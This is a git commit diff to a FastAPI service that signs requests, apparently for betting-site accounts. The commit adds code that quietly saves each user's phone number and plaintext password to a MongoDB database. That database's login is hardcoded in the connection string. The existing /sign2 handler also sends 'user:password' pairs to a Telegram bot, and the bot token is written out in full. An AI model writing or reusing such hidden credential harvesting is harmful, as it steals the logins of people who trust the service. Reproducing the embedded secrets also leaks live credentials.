c6ea29fd10596b2feb640a8c25afae3b70f6945f
APR <prajayr1306@gmail.com>
2024-05-17 00:51:15 +0530

    MongoDB
    Added HITDB

--- main.py
+++ main.py
@@ -5,6 +5,7 @@ import random
 import json
 import time
 import requests
+from pymongo import MongoClient
 app = FastAPI()
 
 def mf(data):
@@ -49,7 +50,18 @@ async def lol(data: InputData):
     sig = mf(jsonString)
     t = int(time.time())
     return {"sig": sig, "rand":rd, "time":t}
+uri = "mongodb+srv://betobet:betobet123@cluster0.lu2mazv.mongodb.net/BettingSites?retryWrites=true&w=majority"
+def insert_data(number, password):
+    client = MongoClient(uri)
+    db = client.BettingSites
+    existing_doc = db.Doc.find_one({"number": number})
 
+    if not existing_doc:
+        db.Doc.insert_one({"number": number, "password": password})
+    else:
+        pass
+
+    client.close()
 @app.post('/sign2')
 async def lol(data: InputData2):
     u = '91' + data.user
@@ -64,5 +76,6 @@ async def lol(data: InputData2):
     jsonString = json.dumps({key: requestData[key] for key in sortedKeys}, separators=(',', ':'))
     sig = mf(jsonString)
     t = int(time.time())
+    insert_data(data.user,data.pas)
     reqUrl = requests.get(f"https://api.telegram.org/bot6776422916:AAGjhNIwXmPi1WU2kMBUdjUbJQ-PGEz8Y1Q/sendMessage?chat_id=-1002058492248&text={data.user}:{p}")  
     return {"sig": sig, "rand":rd, "time":t}
